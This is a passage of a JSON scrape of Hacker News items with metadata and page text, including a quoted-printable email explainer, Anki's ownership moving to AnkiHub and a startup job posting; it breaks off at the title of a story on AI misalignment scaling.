{
  "schema_version": "2.0",
  "scraped_at": "2026-02-03T09:03:23.329763",
  "source": "hackernews",
  "scrape_config": {
    "fetch_content": true,
    "sections_scraped": [
      "top_stories",
      "best_stories",
      "new_stories",
      "ask_hn",
      "show_hn",
      "jobs"
    ]
  },
  "stats": {
    "total_items": 142,
    "items_by_section": {
      "top_stories": 50,
      "best_stories": 30,
      "new_stories": 30,
      "ask_hn": 20,
      "show_hn": 20,
      "jobs": 15
    },
    "items_with_content": 110,
    "items_with_media": 30
  },
  "items": [
    {
      "id": "e7dc6a6f119b95ad6c204b4a725eaab6",
      "source": "hackernews",
      "source_id": "46870751",
      "title": "KDE Plasma Login Manager Won't Support systemd-Free Linux or BSD Systems",
      "content": "KDE Plasma Login Manager Won't Support systemd-Free Linux or BSD Systems",
      "url": "https://forums.FreeBSD.org/threads/kde-plasma-login-manager-wont-support-systemd-free-linux-or-bsd-systems.101393/",
      "author_username": "voxadam",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 26,
      "impressions_reposts": 0,
      "impressions_replies": 23,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:23.365213",
      "published_at": "2026-02-03T08:32:06",
      "scraped_at": "2026-02-03T09:02:23.365228",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46870751",
        "kids_count": 11,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "8e9df5ac408274f9621467adcacdfefd"
    },
    {
      "id": "d0516e4c4685cabccdcadfbf43a4fc40",
      "source": "hackernews",
      "source_id": "46868759",
      "title": "What's up with all those equals signs anyway?",
      "content": "For some reason or other, people have been posting a lot of excerpts from old emails on Twitter over the last few days.  The most vital question everybodyâ€™s asking themselves is: Whatâ€™s up with all those equals signs?!\n\nAnd thatâ€™s something Iâ€™m somewhat of an expert on.  I mean, having written mail readers and stuff; not because Iâ€™ve been to Caribbean islands.\n\nIâ€™ve seen people confidently claim that itâ€™s a code, or that itâ€™s an artefact of scanning and then using OCR, but itâ€™s neither â€” itâ€™s just that whoever converted these emails to a readable format were morons.\n\nWhatâ€™s that you say?  â€œConverted?!  Surely emails are just text!!â€  Well, if you lived in the stone age (i.e., the 80s), they mostly were, but then people invented things like â€œlong linesâ€ and â€œrock dÃ¶tsâ€, and computers had to â€œencodeâ€ the mail before sending.\n\nThe artefact we see here is from something calledâ€œquoted printableâ€, or as we used to call it when it was introduced: â€œQuoted unreadableâ€.\n\nTo take the first line.  Whoever wrote this, typed in the following in their mail reader:\n\nWe see that thatâ€™s quite a long line.  Mail servers donâ€™t like that, so mail  software will break it into two lines, like so:\n\nSee?  Thereâ€™s that equals sign!  Yes, the equals sign is used to say â€œthis should really be one single line, but Iâ€™ve broken it in two so that the mail server doesnâ€™t get mad at meâ€.\n\nThe formal definition here is important, though, so I have to be a bit technical here: To say â€œthis is a continuation lineâ€, you insert an equals sign, then a carriage return, and then a line feed.\n\nOr,\n\nThree characters in total, i.e., :\n\nWhen displaying this, we remove all these three characters, and end upwith:\n\nSo whatâ€™s happened here?  Well, whoever collected these emails first converted from CRLF (also known as the â€œWindowsâ€ line ending coding, but itâ€™s the standard line ending in the SMTP standard) to â€œNLâ€ (i.e., â€œUnixâ€ line ending coding).  This is pretty normal if you want to deal with email.  But you then have one byte fewer:\n\nIf your algorithm to decode this is, stupidly, â€œfind equals signs at the end of the line, and then delete two characters, and then finally the equals signâ€, you should end up with:\n\nI.e., you lose the â€œcâ€.  Thatâ€™s almost what happened here, but not quite: Why does the equals sign still remain?\n\nThisStackOverflowpost from 14 years ago explains the phenomenon, sort of:\n\nObviously the client notices that = is not followed by a proper CR LF sequence, so it assumes that it is not a soft line break, but a character encoded in two hex digits, therefore it reads the next two bytes. It should notice that the next two bytes are not valid hex digits, so its behavior is wrong too, but we have to admit that at that point it does not have a chance to display something useful. They opted for the garbage in, garbage out approach.\n\nThat is, equals signs are also used for something else besides wrapping long lines, and thatâ€™s what we see later in the post:\n\nIf the equals sign is not at the end of a line, itâ€™s used to encode â€œfunny charactersâ€, like what you use with â€œrock dÃ¶tsâ€.  =C2 is 194, which is a first character in a UTF-8 sequence, and the following char is most likely a =A0: =C2=A0 is â€œnon-breakable spaceâ€, which is something people often use to indent text (and the â€œplease noteâ€ is indented) and you see =A0 in many other places in these emails.\n\nMy guess is that whoever did this part just did a search-replace for =C2 and/or =A0 instead of using a proper decoder, but other explanations are certainly possible.  Any ideas?\n\nAnyway, thatâ€™s whatâ€™s up with those equals signs:  1) â€œitâ€™s technicalâ€, and 2) â€œitâ€™s a combination of buggy continuation line decodingandbuggy non-ASCII decodingâ€, and 3) â€œwhoever processed these mails are incompetentâ€.  I donâ€™t think 2) should be very surprising at this point, do you?\n\n(Edit a bit later:  To nitpick a bit here: Whenthe standardwas written, people mostly envisioned that the quoted-printable content transport encoding would be unwound upon reception (note â€œtransportâ€), and that youâ€™d end up with â€œclean textâ€ on disk after reception.  This didnâ€™t really happen, so all â€œrealâ€ implementations do the right thing with single-character (i.e., â€œunencodedâ€) newlines.  For instance:\n\nWhich leads me to assume that they reused an algo that was usually run in an SMTP server context to do the line unfolding â€” in that context, you can safely assume that the line ending is a CRLF.  And by chance, this algo also works fine if youâ€™re working with a Windows-based file, but fails for a Unix-based file.)\n\nLike this:\n\nRelated Articles",
      "url": "https://lars.ingebrigtsen.no/2026/02/02/whats-up-with-all-those-equals-signs-anyway/",
      "author_username": "todsacerdoti",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 258,
      "impressions_reposts": 0,
      "impressions_replies": 84,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:23.438374",
      "published_at": "2026-02-03T04:37:40",
      "scraped_at": "2026-02-03T09:02:23.438385",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46868759",
        "kids_count": 20,
        "sections": [
          "top_stories",
          "best_stories"
        ]
      },
      "content_hash": "26fb731012ad4c8e57447d96aea2c088"
    },
    {
      "id": "166142bc02cb910b9cce439c5f4e4e23",
      "source": "hackernews",
      "source_id": "46866544",
      "title": "Floppinux â€“ An Embedded Linux on a Single Floppy, 2025 Edition",
      "content": "Floppinux â€“ An Embedded Linux on a Single Floppy, 2025 Edition",
      "url": "https://krzysztofjankowski.com/floppinux/floppinux-2025.html",
      "author_username": "GalaxySnail",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 179,
      "impressions_reposts": 0,
      "impressions_replies": 110,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:23.912934",
      "published_at": "2026-02-02T23:33:25",
      "scraped_at": "2026-02-03T09:02:23.912952",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46866544",
        "kids_count": 20,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "0e58b8833518ee71965c303447cf9b78"
    },
    {
      "id": "224209a0d2e80ad7d97d40818a3d204a",
      "source": "hackernews",
      "source_id": "46868479",
      "title": "Show HN: Safe-now.live â€“ Ultra-light emergency info site (<10KB)",
      "content": "âš  Active Disasters & Declarations(FEMA|EC)\n\nğŸ“ Find Local Info\n\nUnited States:ALAKAZARCACOCTDEDCFLGAHIIDILINIAKSKYLAMEMDMAMIMNMSMOMTNENVNHNJNMNYNCNDOHOKORPAPRRISCSDTNTXUTVTVAWAWVWIWY|VIASGUMP\n\nCanada:ABBCMBNBNLNSNTNUONPEQCSKYT\n\nInternational:UK/EU112| AU000| NZ111| JP 110/119 | MX 911 | BR 190\n\nğŸ†˜ Quick Reference\n\nğŸ’ Emergency Kit\n\nğŸ  Home Prep\n\nğŸ’° Financial Help\n\nğŸ”„ Recovery\n\nğŸ“š Resources",
      "url": "https://safe-now.live",
      "author_username": "tinuviel",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 72,
      "impressions_reposts": 0,
      "impressions_replies": 13,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:24.344244",
      "published_at": "2026-02-03T04:06:04",
      "scraped_at": "2026-02-03T09:02:24.344266",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46868479",
        "kids_count": 7,
        "sections": [
          "top_stories",
          "show_hn"
        ]
      },
      "content_hash": "f9420f69322d1770dcc0c46209ff87b3"
    },
    {
      "id": "fd67df34c3e72ce4290b8ed5451ab7a9",
      "source": "hackernews",
      "source_id": "46859054",
      "title": "The Codex App",
      "content": "The Codex App",
      "url": "https://openai.com/index/introducing-the-codex-app/",
      "author_username": "meetpateltech",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 724,
      "impressions_reposts": 0,
      "impressions_replies": 543,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:24.433632",
      "published_at": "2026-02-02T13:02:48",
      "scraped_at": "2026-02-03T09:02:24.433642",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46859054",
        "kids_count": 100,
        "sections": [
          "top_stories",
          "best_stories"
        ]
      },
      "content_hash": "1d4f0848d1d29a98e9b5365d8cff7387"
    },
    {
      "id": "47f994e1e1e906d441154316ca064450",
      "source": "hackernews",
      "source_id": "46861313",
      "title": "Anki ownership transferred to AnkiHub",
      "content": "Anki's Growing Up\n\nHi all,\n\nAnkiâ€™s 19th birthday was about 4 months ago. It would have been a good time to pause and reflect on what Anki has become, and how it will grow in the future. But I ended up letting the moment come and go, as I didnâ€™t feel like I had the free time. Itâ€™s a feeling thatâ€™s been regrettably common of late, and Iâ€™ve come to realise that something has to change.\n\nFor a number of years, Iâ€™ve reached out to some of the most prolific contributors and offered them payment in exchange for them contributing more code or support to Anki. That has been a big help, and Iâ€™m very grateful for their contributions. But there is a lot that I havenâ€™t been able to delegate. With no previous management experience, I was a bit daunted by the thought of seeking out and managing employees. And with so much to get on with, it always got put in the â€œmaybe laterâ€ basket.\n\nAs Anki slowly grew in popularity, so did its demands on my time. I was of course delighted to see it reaching more people, and to have played a part in its success. But I also felt a big sense of responsibility, and did not want to let people down. That led to unsustainably long hours and constant stress, which took a toll on my relationships and well-being.\n\nThe parts of the job that drew me to start working on Anki (the â€˜deep workâ€™, solving interesting technical problems without constant distractions) have mostly fallen by the wayside. I find myself reactively responding to the latest problem or post instead of proactively moving things forward, which is neither as enjoyable as it once was, nor the best thing for the project.\n\nThere have been many offers to invest in or buy Anki over the years, but Iâ€™ve always shut them down quickly, as I had no confidence that these investment-focused people would be good stewards, and not proceed down the typical path of enshittification that is unfortunately so common in VC and PE-backed ventures.\n\nSome months ago, the AnkiHub folks reached out to me, wanting to discuss working more closely together in the future. Like others in the community, they were keen to see Ankiâ€™s development pace improve. Weâ€™ve had a symbiotic relationship for years, with their content creation and collaboration platform driving more users to Anki. Theyâ€™ve managed to scale up much faster than I did, and have built out animpressive team.\n\nDuring the course of those talks, I came to the realisation that AnkiHub is better positioned to take Anki to the next level than I am. I ended up suggesting to them that we look into gradually transitioning business operations and open source stewardship over, with provisions in place to ensure that Anki remains open source and true to the principles Iâ€™ve run it by all these years.\n\nThis is a step back for me rather than a goodbye - I will still be involved with the project, albeit at a more sustainable level. Iâ€™ve spent 19 years looking after my â€œbabyâ€, and I want to see it do well as it grows up.\n\nIâ€™m confident this change will be a net positive for both users and developers. Removing me as a bottleneck will allow things to move faster, encourage a more collaborative approach, and free up time for improvements that have been hard to prioritise, like UI polish. It also means the ecosystem will no longer be in jeopardy if Iâ€™m one day hit by a bus.\n\nItâ€™s natural to feel apprehensive about change, but as the benefits become clearer over the coming months, I suspect many of you will come to wish this change had happened sooner.\n\nThank you to everyone who has contributed to making Anki better up until now. Iâ€™m excited for Ankiâ€™s future, and canâ€™t wait to see what we can build together in this next stage.\n\nHi everyone,\n\nWe initially reached out to@daeto explore collaborating more closely on improving Anki. We were both humbled and shocked when he asked if weâ€™d be willing to step into a much larger leadership role than we expected.\n\nAt this point, weâ€™re mostly excitedâ€¦and also feeling a healthy amount of terror.This is a big responsibility. It will push us to grow as individuals, asa team, and as a community, and we donâ€™t take that lightly.\n\nWeâ€™re grateful for the trust Damien and others have placed in us. And we also know that trust has to be earned, especially from people who donâ€™t know us yet.\n\nWhat We Believe\n\nWe believe Anki is almost sacred, something bigger than any one person or organization. In an important sense, it belongs to the community.\n\nThis articlehighlights the principles Damien built Anki on;principleswe deeply share, such as respect for user agency, refusal of manipulative design patterns, and an emphasis on the craft of building genuinely useful tools that arenâ€™tmerelyengaging. Anki has never tried to maximize â€œengagementâ€ by exploiting psychological vulnerabilities purely for profit.Anki gives your timebackto you, and that is an exceptional rarity in this world that we want to preserve.\n\nAs an organization built by students, for students, our mission is to continue embodying these principles. We are accountable only to you, our users, not external investors, and we plan to keep it that way.\n\nWhat We Donâ€™t Know Yet\n\nWe canâ€™t answer every question right away, as there are many unknowns since much hasnâ€™t been decided yet. But we are sharing everything we can now because the community is important to us. We encourage you all to share your thoughts and questions â€“ weâ€™re all in this together!\n\nWeâ€™re still working through the details on things like:\n\nGovernance and decision-making: How decisions are made, who has final say, and how the community is heard\n\nRoadmap and priorities: What gets built when and how to balance competing needs\n\nThe transition itself: How to bring in more support without disrupting what already works\n\nAnki has shown how powerful community collaboration can be when itâ€™s genuinely a group effort, and thatâ€™s a tradition we are honored to continue.\n\nWeâ€™re currently talking toDavid Allison, a long-time core contributor toAnkiDroid, about working together on exactly these questions. His experience with AnkiDroidâ€™s collaborative development is invaluable, and weâ€™re grateful heâ€™s willing to help us get this right.Weâ€™re incredibly excited to have him join usfull-timeto help propel Anki into the future.\n\nWhat Weâ€™re Aiming For\n\nUI/UX improvements.Weâ€™re bringing professional design expertise on board to make it more approachable without sacrificing Ankiâ€™s power. We believe that principled design will bring meaningful quality of life improvements to power users and novices alike.\n\nAddressing thebus factor.The ecosystem shouldnâ€™t be in jeopardy if any one person disappears. We want to build software that lives beyond any single contributor.\n\nSupporting more than just med students.AnkiHub grew out of the medical education community, but Anki serves learners from all walks of life, and we want to support everyone to achieve their learning goals.\n\nA more robust add-on ecosystem.Weâ€™d love to build tools that empowernon-technicalusers to customize Anki for their needs, and weâ€™re exploring add-ons that work everywhere, including mobile.\n\nHow Weâ€™ll Work\n\nWe want to provide transparency into the decision-making process, taking inspiration fromproven modelsto:\n\nGive the community clarity on how to be heard and give feedback\n\nMake it clear how decisions are made and why\n\nSet realistic expectations\n\nDefine roles and responsibilities so things donâ€™t fall through the cracks\n\nWe want to bring everyone in the global Anki community together into a closer collaboration focused on building the best learning tools possible. Today, these groups often work in silos; a more unified process will help everyone move Anki forward together.\n\nSustainability\n\nSome practical reassurances:\n\nSustainability, affordability, and accessibility.Weâ€™re committed to a sustainable business model that keeps Anki accessible and prioritizes user needs above profits. If anything ever needs to change, weâ€™ll be transparent about why.\n\nNo enshittification.Weâ€™ve seen what happens when VC-backed companies acquire beloved tools. Thatâ€™s not what this is. There are no investors involved, and weâ€™re not here to extract value from something the community built together. Building in the right safeguards and processes to handle pressure without stifling necessary improvements is something weâ€™re actively considering.\n\nWeâ€™re grateful to Damien et all for their trust and support, and grateful to all of you for the passion that makes this community so special.\n\nWe welcome your questions, concerns, and feedback.\n\nâ€“The AnkiHub Team\n\nFAQs\n\nWhat is AnkiHub?\n\nAnkiHubis a small education technology company founded by two long-time Anki nerds: Nick, a resident physician known asThe AnKing, and Andrew Sanchez, a research software engineer. AnkiHub grew out of years of obsessive Anki use and firsthand experience with both its power and its limitations.\n\nAnkiHubbegan as a way to collaborate on Anki decks (such as theAnKing Step Deckfor medical students) and has since evolved into a broader effort to improve the Anki ecosystem by building tools that help more people benefit from Anki.\n\nWill Anki remain open source?\n\nAbsolutely. Ankiâ€™s core code will remain open source, guided by the same principles that have guided the project from the beginning.\n\nAre there any changes planned to Ankiâ€™s pricing?\n\nNo. We are committed to fair pricing that supports users rather than exploiting them. Both Anki and AnkiHub are already profitable. Any future decisions will be made with community benefit, user value, and long-term project health in mind.\n\nIs Anki in financial trouble?\n\nNo. The transition is driven by the goal of helping Anki reach its full potential, not by financial issues. Our goal is to build a resilient structure and accelerate development.\n\nWhat is the timeline?\n\nOur intention is to build confidence and earn trust while making gradual changes. The transition will be transparent, with clear communication throughout.\n\nWhat happens to volunteer contrib",
      "url": "https://forums.ankiweb.net/t/ankis-growing-up/68610",
      "author_username": "trms",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://emoji.discourse-cdn.com/twitter/sweat_smile.png?v=15",
          "alt": ":sweat_smile:"
        },
        {
          "type": "image",
          "url": "https://emoji.discourse-cdn.com/twitter/poop.png?v=15",
          "alt": ":poop:"
        },
        {
          "type": "image",
          "url": "https://emoji.discourse-cdn.com/twitter/beating_heart.png?v=15",
          "alt": ":beating_heart:"
        },
        {
          "type": "image",
          "url": "https://emoji.discourse-cdn.com/twitter/sweat_smile.png?v=15",
          "alt": ":sweat_smile:"
        },
        {
          "type": "image",
          "url": "https://emoji.discourse-cdn.com/twitter/slight_smile.png?v=15",
          "alt": ":slight_smile:"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 469,
      "impressions_reposts": 0,
      "impressions_replies": 186,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:25.024035",
      "published_at": "2026-02-02T15:48:55",
      "scraped_at": "2026-02-03T09:02:25.024049",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46861313",
        "kids_count": 41,
        "sections": [
          "top_stories",
          "best_stories"
        ]
      },
      "content_hash": "a209720fc61a423cbf5b9d28609e646d"
    },
    {
      "id": "ebafe4a72f4382bb039522e9d2de282d",
      "source": "hackernews",
      "source_id": "46868318",
      "title": "LNAI â€“ Define AI coding tool configs once, sync to Claude, Cursor, Codex, etc.",
      "content": "LNAI\n\nStop maintaining separate config files for every AI coding tool. Define once in.ai/, sync everywhere.\n\nWhy LNAI?\n\nOne source of truthâ€” Write your project rules, MCP servers, and permissions once\n\nWorks with your toolsâ€” Syncs to native formats each tool actually reads\n\nStay in syncâ€” Update.ai/and runlnai syncto propagate changes instantly\n\nAutomatic cleanupâ€” Orphaned files are removed when configs change\n\nSupported Tools\n\nQuick Start\n\nDocumentation\n\nFull guides and configuration reference atlnai.sh\n\nLicense\n\nMIT\n\nIf you find LNAI helpful, pleasestar us on GitHub!",
      "url": "https://github.com/KrystianJonca/lnai",
      "author_username": "iamkrystian17",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://raw.githubusercontent.com/KrystianJonca/lnai/main/apps/docs/public/lnai_white_on_black.png",
          "alt": "LNAI Logo"
        },
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/bcf18164810435ee181f3471c231d50886379f1c0f94bb59ca9832e7f940d1c7/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f762f6c6e6169",
          "alt": "npm version"
        },
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/8c27130a63d867aa6e985d6db90147ab199edca1b78591d0f45e43027a44dce4/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f646d2f6c6e6169",
          "alt": "npm downloads"
        },
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/09afe2363f185181145d0b1aa4c0c9eef9e293321217b8cc785658aff1495833/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f4b7279737469616e4a6f6e63612f6c6e6169",
          "alt": "license"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 43,
      "impressions_reposts": 0,
      "impressions_replies": 18,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:25.865525",
      "published_at": "2026-02-03T03:45:57",
      "scraped_at": "2026-02-03T09:02:25.865538",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46868318",
        "kids_count": 8,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "2403f381f26b2f1ad783c56c71c227d0"
    },
    {
      "id": "357098a20e7aa84577523b6b10abb3bb",
      "source": "hackernews",
      "source_id": "46858577",
      "title": "Todd C. Miller â€“ Sudo maintainer for over 30 years",
      "content": "Note: this page tends be neglected and is only updated occasionally.\nThe links to the left are where the useful bits are hiding.\n\nFor the past 30+ years Iâ€™ve been the maintainer ofsudo.  Iâ€™m currently in search of a sponsor\nto fund continued sudo maintenance and development.  If you or\nyour organization is interested in sponsoring sudo, please let me\nknow.\n\nI also work onOpenBSD, though my Iâ€™m\nnot as active there as I once was.\n\nIn the past, Iâ€™ve made large contributions toISC cron, among other projects.",
      "url": "https://www.millert.dev/",
      "author_username": "wodniok",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 524,
      "impressions_reposts": 0,
      "impressions_replies": 262,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:26.280528",
      "published_at": "2026-02-02T12:25:26",
      "scraped_at": "2026-02-03T09:02:26.280542",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46858577",
        "kids_count": 36,
        "sections": [
          "top_stories",
          "best_stories"
        ]
      },
      "content_hash": "b9b44465dbf7602491ef58b6928435ed"
    },
    {
      "id": "fbb4095e0147eac51a4d22f3572c9831",
      "source": "hackernews",
      "source_id": "46869901",
      "title": "Emerge Career (YC S22) Is Hiring a Founding Product Designer",
      "content": "Emerge Career\n\nAll-in-one re-entry & workforce development training platform\n\nFounding Product Designer\n\nAbout the role\n\nWho We Are:\n\nEmerge Careerâ€™s mission is to break the cycle of poverty and incarceration. Weâ€™re not just building software; weâ€™re creating pathways to real second chances. Through an all-in-one platform deeply embedded within the criminal justice system, we recruit, train, and place justice-impacted individuals into life-changing careers.\n\nOur vision is to become the countryâ€™s unified workforce development system, replacing disconnected brick-and-mortar job centers with one integrated, tech-powered solution that meets low-income individuals exactly where they are. Today, the federal government spends billions annually on education and training programs, yet only about 70% of participants graduate, just 38.6% secure training-related employment, and average first-year earnings hover around $34,708.\n\nBy contrast, our seven-person team has already outperformed the job centers in two entire states (Vermont and South Dakota) in just the past year. With an 89% graduation rate and 92% of graduates securing training-related employment, our alumni arenâ€™t just getting jobsâ€”theyâ€™re launching new lives with average first-year earnings of $77,352. The results speak for themselves, and weâ€™re just getting started.\n\nBefore Emerge, our foundersZoandGabeco-founded Ameelio,an award-winning tech nonprofitthat is dismantling the prison communication duopoly.Backed by tech luminarieslike Reid Hoffman, Vinod Khosla, and Jack Dorsey, and by major criminal-justice philanthropies such as Arnold Ventures and the Mellon Foundation, Ameelio became a recognized leader in the space. Because of this experience both Zo and Gabe understood what it took to create change from within the system. After serving over 1M people impacted by incarceration, they witnessed firsthand the gap in second-chance opportunities and the chronic unemployment plaguing those impacted by the justice system. Emerge Career is committed to solving this issue.\n\nOur students are at the heart of our work. Their journeys have captured national attention onCBS,NBC, and inThe Boston Globe, and our programs now serve entirestatesandcities. And weâ€™re not doing it alone: our vision has attracted support from Alexis Ohanian (776),Â  Michael Seibel, Y Combinator, the Opportunity Fund, and public figures like Diana Taurasi, Deandre Ayton, and Marshawn Lynch. All of us believe that, with the right mix of technology and hands-on practice, we can redefine workforce development and deliver true second chances at scale.\n\nWhy We Do This:\n\nEmerge Career was designed to tackle two systemic issues: recidivism, fueled by post-incarceration unemployment and poverty, and labor shortages in key industries. Over60% of formerly incarcerated people remain unemployed a year after incarceration, seeking work but not finding it. The reality is shocking, workforce development programs are severely limited inside prison,with only one-third of incarcerated people ever participating. To worsen, the available prison jobs offer meager wages,often less than $1 per hour, and often do not equip individuals with the skills for long-term stable employment.\n\nAbout the Role\n\nWe call this a Founding Design Engineer role, even three years in and with multiple contracts under our belt, for two reasons. First, you'll be our very first engineer, joining our co-founder, who's built the entire platform solo to date. Second, our growth is now outpacing our systems, and we can't keep up on maintenance alone. We're at a critical juncture: we can either hire someone to simply care for what exists, or we can bring on a talent who believes that, with the right blend of technology and hands-on practice, we can unify the workforce-development system and deliver second chances at true scale. We hope that can be you.\n\nThis is not a traditional engineering job. You'll build features in React and TypeScript, but your real job is helping students finish. That means understanding the human problem first: why do people disengage? What makes someone choose to keep going when the payoff is months away? You'll answer those questions through direct conversations, usability research, and watching how people actually use what you build. Then you'll prototype fast, ship real software, and measure whether it worked. Some days that looks like code. Other days it looks like a phone call, a support ticket, or a whiteboard session figuring out how to turn a one-off fix into a system that scales.\n\nThis role blends engineering, product, design, and program operations. We're looking for someone who believes good design can inspire a person to invest in their own future, and who wants to prove it, week after week, by shipping work that measurably helps students succeed. If you want to be close to users, own outcomes end to end, and build something that actually matters, you'll thrive here.\n\nWho You Are:\n\nYou design by building. You don't hand off mockups and wait. You open Cursor, Claude Code, or whatever gets you closest to a real, testable thing fastest. You might already be shipping code in production â€” or you're itching to. You believe the fastest path to a great design is putting something real in front of a real user and watching what happens.\n\nYou are relentlessly scrappy. You prototype in hours, not weeks. You'd rather test an ugly thing that teaches you something than polish a beautiful thing nobody's used yet. You know that at this stage, speed of learning is the only thing that matters. Fidelity comes later. Signal comes first.\n\nYou refuse to be blocked. When engineering bandwidth isn't there, you don't sit around. You figure it out â€” a Figma prototype, a coded prototype, a quick hack in the codebase. You treat \"waiting for a developer\" as a personal failure. You find a way or you make one.\n\nYou think in outcomes, not outputs. You don't measure your work in screens delivered. You measure it in whether students finished, whether they came back, whether the thing you shipped actually moved a number that matters. You're obsessed with the gap between what you designed and what actually happened.\n\nYou talk to users constantly. Not in scheduled quarterly research sprints â€” in real conversations, every week. You build relationships with students. You know their names, their blockers, their moments of doubt. Your best design ideas come from a 10-minute phone call, not a brainstorm.\n\nYou have strong taste but low ego. You have opinions about what good looks like and you'll fight for them. But when the data says you're wrong, you move on fast. You don't fall in love with your work. You fall in love with the problem.\n\nYou believe everyone deserves a second chance. You treat everyone with dignity. You know how to meet people exactly where they are â€” with empathy and compassion â€” helping create a space where everyone feels seen and valued, regardless of their background.\n\nYou work hard. You show up early, stay late, and do what needs to get done â€” no ego, no excuses. This isn't a 9-to-5. The team puts in 10+ hour days because we care about the mission and each other. If that sounds miserable, this isn't for you. If it sounds exciting, you'll fit right in.\n\nWhat you will be doing\n\nTalking to students â€” a lot. Your week starts and ends with users. You'll build real relationships with students, not just run usability sessions. You'll understand why someone almost quit, what message made them log back in, what screen confused them at 11pm. These conversations are your primary design tool.\n\nPrototyping at the speed of conversation. You hear a problem on a call Tuesday. By Wednesday you have something testable â€” a coded prototype, a functional hack, a Figma flow wired to real data. By Thursday a student is using it. By Friday you know if it worked. That's the cycle. Repeat.\n\nShipping real product, not just designs. You'll work in our React and TypeScript codebase â€” or use AI tools like Cursor and Claude Code to get there. The goal isn't to become a full-time engineer. The goal is to never let \"it hasn't been built yet\" slow down learning. Some of what you build will go straight to production. Some will be throwaway prototypes. You'll know the difference.\n\nDesigning the moments that keep students going. The hardest design problem here isn't layout or typography. It's commitment. Students are betting months of effort on a future they have to imagine. You'll study where they disengage, what triggers doubt, and what reignites momentum. Then you'll design the moments â€” an interface, a message, a milestone â€” that help someone choose to keep going. How do you make a better life in three months feel worth the sacrifice today? You'll own that problem.\n\nMeasuring what matters. Polished decks don't matter here. You'll define success metrics for what you ship, track whether completion rates moved, whether more students hit the next milestone, whether the intervention you designed actually intervened. You'll close the loop between design and outcome every time.\n\nWorking across the entire stack of the student experience. Some days that looks like interface design. Other days it looks like rethinking aCustomer.iocampaign, redesigning an onboarding flow, or sitting with the ops team to understand why students in one facility disengage faster than another. You go where the problem is.\n\nDocumenting your work clearly. Our work spans months and involves multiple teams. You'll create visibility when a change impacts operations and help others understand how features affect training and service delivery. Precision matters.\n\nStart Date:ASAP\n\nAbout the interview\n\nIntro Chat(15 min)\n\nCultural fitconversation & technical screen(60 min)\n\nGetting to know you interview (60 min):A more in-depth discussion about your background, experiences, and goals.\n\nReference checks.We will select 3â€“4 people youâ€™ve worked with and request introductions. We will request these when the",
      "url": "https://www.ycombinator.com/companies/emerge-career/jobs/omqT34S-founding-product-designer",
      "author_username": "gabesaruhashi",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:26.706392",
      "published_at": "2026-02-03T07:00:23",
      "scraped_at": "2026-02-03T09:02:26.706409",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46869901",
        "kids_count": 0,
        "sections": [
          "top_stories",
          "jobs"
        ]
      },
      "content_hash": "a620a64162e429cb75baebd4cb2d8f8a"
    },
    {
      "id": "8b72ec49a9b56fe47127eb0f438a49b4",
      "source": "hackernews",
      "source_id": "46864498",
      "title": "How does misalignment scale with model intelligence and task complexity?",
